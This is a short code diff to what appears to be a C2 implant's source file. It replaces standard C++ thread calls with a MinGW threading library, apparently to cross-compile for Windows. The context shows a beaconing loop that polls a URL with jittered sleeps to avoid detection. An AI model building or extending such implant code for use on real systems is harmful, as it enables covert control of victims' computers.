@@ -1,7 +1,7 @@
 #include "implant.h"
 #include "xhttp.h"
 #include <chrono>
-#include <thread>
+#include "mingw.thread.h"
 #include <random>
 #include <stdexcept>
 #include <iostream>
@@ -40,11 +40,11 @@ void beacon() {
             std::string response = xhttp::http_get(url);
 
             // Sleep for the calculated time
-            std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
+            mingw_stdthread::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
         }
         catch (const std::exception& e) {
             //printf("\nBeaconing error: %s\n", e.what());
-            std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
+            mingw_stdthread::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));
         }
     }
     // cleanup
